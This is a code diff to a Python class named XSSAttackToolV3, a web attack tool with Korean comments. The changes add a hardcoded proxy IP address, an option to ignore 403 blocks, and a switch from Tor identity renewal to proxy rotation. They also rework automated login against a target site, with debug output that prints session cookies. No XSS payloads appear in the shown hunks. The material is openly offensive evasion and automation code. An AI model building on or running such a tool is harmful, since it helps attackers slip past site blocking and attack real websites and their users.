@@ -56,6 +56,7 @@ class XSSAttackToolV3:
 
     def setup_session(self):
         """세션 설정"""
+        self.session = requests.Session() # 세션 초기화
         self.session.headers.update({
             'User-Agent': random.choice(self.user_agents),
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
@@ -69,9 +70,10 @@ class XSSAttackToolV3:
     def setup_proxy_list(self):
         """프록시 리스트 설정"""
         self.proxy_list = [
-            'http://proxy1.com:8080',
-            'http://proxy2.com:3128',
-            # 실제 작동하는 프록시로 교체 필요
+            # 'http://proxy1.com:8080',
+            # 'http://proxy2.com:3128',
+            # # 실제 작동하는 프록시로 교체 필요
+            'http://3.38.101.138:48293'
         ]
         self.current_proxy = 0
         
@@ -127,7 +129,7 @@ class XSSAttackToolV3:
         else:
             print(f"{Fore.RED}[-] Proxy rotation failed{Style.RESET_ALL}")
 
-    def make_request(self, url, method='GET', max_retries=3, **kwargs):
+    def make_request(self, url, method='GET', max_retries=3, ignore_403=False, **kwargs):
         """403 처리가 포함된 공통 요청 함수"""
         for attempt in range(max_retries):
             try:
@@ -139,7 +141,7 @@ class XSSAttackToolV3:
                     response = self.session.request(method, url, **kwargs)
                 
                 # 403 처리
-                if response.status_code == 403:
+                if response.status_code == 403 and not ignore_403:
                     print(f"{Fore.RED}[-] Blocked (403) - Attempt {attempt + 1}/{max_retries}{Style.RESET_ALL}")
                     
                     if self.use_proxy and attempt < max_retries - 1:
@@ -155,8 +157,8 @@ class XSSAttackToolV3:
             except Exception as e:
                 print(f"{Fore.RED}[-] Request error: {e}{Style.RESET_ALL}")
                 if attempt < max_retries - 1:
-                    if self.use_tor:
-                        self.get_new_tor_identity()
+                    if self.use_proxy:
+                        self.get_new_proxy()
                     time.sleep(5)
                 else:
                     raise
@@ -197,8 +199,10 @@ class XSSAttackToolV3:
         
         # 정상적인 로그인 페이지 방문
         # 기존: self.session.get(login_url)
-        self.make_request(login_url, method='GET')  # 수정
-        self.smart_delay()
+        # response = self.make_request(login_url, method='GET')  # 수정
+        # if response:
+        #     print(f"[DEBUG] Login page status: {response.status_code}")
+        # self.smart_delay()
 
         data = {'username': username, 'password': password}
         
@@ -206,10 +210,26 @@ class XSSAttackToolV3:
             # 기존: response = self.session.post(login_url, data=data, allow_redirects=True)
             response = self.make_request(login_url, method='POST', data=data, allow_redirects=True)  # 수정
             
-            if response and ('index.php' in response.url or response.status_code == 200):
-                print(f"{Fore.GREEN}[+] Login successful!{Style.RESET_ALL}")
-                self.logged_in = True
-                return True
+            if response:
+                print(f"[DEBUG] Login response status: {response.status_code}")
+                print(f"[DEBUG] Response URL: {response.url}")
+                
+                # 쿠키 확인
+                print(f"[DEBUG] Cookies: {self.session.cookies.get_dict()}")
+
+                # index.php로 리다이렉트 확인
+                if 'index.php' in response.url or response.status_code == 200:
+                    # 실제로 로그인되었는지 확인
+                    check_response = self.make_request(f"{self.target_url}/index.php", method='GET')
+                    if check_response and ("logout" in check_response.text.lower() or username in check_response.text):
+                        print(f"{Fore.GREEN}[+] Login successful!{Style.RESET_ALL}")
+                        self.logged_in = True
+                        return True
+                
+                # 에러 메시지 확인
+                if "error" in response.text.lower() or "fail" in response.text.lower():
+                    print(f"{Fore.RED}[-] Login failed: Invalid credentials{Style.RESET_ALL}")
+
         except Exception as e:
             print(f"{Fore.RED}[-] Login error: {e}{Style.RESET_ALL}")
         
